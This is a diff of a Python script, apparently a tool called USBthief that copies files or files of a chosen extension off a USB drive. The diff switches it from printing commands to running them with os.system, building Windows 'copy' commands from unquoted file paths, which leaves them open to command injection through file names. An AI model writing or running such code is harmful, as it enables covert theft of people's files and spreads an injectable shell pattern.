@@ -38,14 +38,13 @@ if Copy_Choice == 1:
 
     for SingleFile in FilesPath:
         Command = 'copy ' + SingleFile + ' ' + LocalPath
-        print(Command)
-        # os.system(Command)
+        os.system(Command)
    
     USBthief.close()
    
 elif Copy_Choice == 2:
 
-    TargetEnd = "json"#input("请输入文件的后缀名：")
+    TargetEnd = input("请输入文件的后缀名：")
     FilesPath = Get_FilesPath(CopyPath)
     
     for SingleFile in FilesPath:
@@ -61,14 +60,13 @@ elif Copy_Choice == 2:
         # 提取读取文件的后缀名并用FilesEnd接受
         if FilesEnd == TargetEnd:
             Command = 'copy ' + SingleFile + ' ' + LocalPath
-            print(Command)
-            # os.system(Command)
+            os.system(Command)
         # 通过判断后缀格式筛选索要复制的文件
     USBthief.close()
 
 elif Copy_Choice == 3:
 
-    TargetEnd = "dll"#input("请输入文件的后缀名：")
+    TargetEnd = input("请输入文件的后缀名：")
     FilesPath = Get_AllFiles(CopyPath)
     
     for SingleFile in FilesPath:
@@ -84,8 +82,7 @@ elif Copy_Choice == 3:
         # 提取读取文件的后缀名并用FilesEnd接受
         if FilesEnd == TargetEnd:
             Command = 'copy ' + CopyPath + '\\' + SingleFile + ' ' + LocalPath
-            print(Command)
-            # os.system(Command)
+            os.system(Command)
         # 通过判断后缀格式筛选索要复制的文件
     USBthief.close()
 
